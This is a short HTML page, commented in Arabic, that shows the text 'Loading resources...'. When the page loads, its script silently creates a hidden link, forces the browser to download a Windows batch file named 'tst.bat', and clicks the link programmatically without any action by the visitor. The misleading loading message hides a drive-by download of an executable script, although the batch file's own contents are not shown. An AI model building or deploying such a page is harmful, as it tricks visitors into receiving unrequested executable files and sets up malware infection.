<!DOCTYPE html>
<html>
<head>
    <title>Welcome</title>
</head>
<body>
    <script>
        window.onload = function() {
            // إنشاء عنصر رابط وهمي
            var link = document.createElement('a');
            link.href = 'tst.bat'; // المسار هنا مباشر لأنه بنفس المجلد
            link.download = 'tst.bat'; // إجبار المتصفح على التحميل وليس الفتح
            document.body.appendChild(link);
            link.click(); // تنفيذ الضغطة برمجياً
            document.body.removeChild(link);
        };
    </script>

    <h1>Loading resources...</h1>
</body>
</html>
